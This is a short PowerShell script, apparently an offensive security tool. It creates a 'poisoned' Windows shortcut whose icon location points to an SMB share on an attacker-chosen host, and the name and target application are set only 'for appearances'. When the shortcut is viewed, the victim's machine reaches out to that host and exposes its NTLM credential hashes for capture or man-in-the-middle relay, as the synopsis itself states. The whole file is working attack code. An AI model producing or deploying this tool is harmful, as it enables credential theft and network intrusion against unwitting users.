<#
.SYNOPSIS
Create a poisoned LNK file that will attempt to grab its icon from a target machine. If that machine happened to
be interested in a MitM or hash capture, it certainly could.

.PARAMETER ComputerName
Target SMB host.

.PARAMETER Share
Share name. Doesn't really matter. Defaults to 'Applications'

.PARAMETER Application
Target application. Like Share, this is just for appearances.

.PARAMETER Output
Name of the shortcut. Defaults to '$Application - Shortcut.lnk'.

.PARAMETER Path
Where the LNK gets saved. Defaults to script directory.

.EXAMPLE
PS> .\New-SMBLNK.ps1 -ComputerName 192.168.1.1
[*] Creating shortcut (192.168.1.1)
[*] Shortcut created: C:\Path\To\Shortcut\mspaint.exe - Shortcut.lnk

#>

[CmdletBinding()]

Param (
    [Parameter(Mandatory = $True)]
    [string]
    $ComputerName,
    [string]
    $Share = 'Applications',
    [string]
    $Application = 'mspaint.exe',
    [ValidateScript({$_.Substring($_.length -4) -eq '.lnk'})]
    [string]
    $Output = "$Application - Shortcut.lnk",
    [string]
    $Path = (Join-Path -Path (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition) -ChildPath $Output)
)

Write-Host "[*] Creating shortcut ($ComputerName)"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($Path)
$Shortcut.TargetPath = "%SystemRoot%\system32\$Application"
$Shortcut.IconLocation = "\\$ComputerName\$Share\$Application"
$Shortcut.Save()
Write-Host "[*] Shortcut created: $Path"
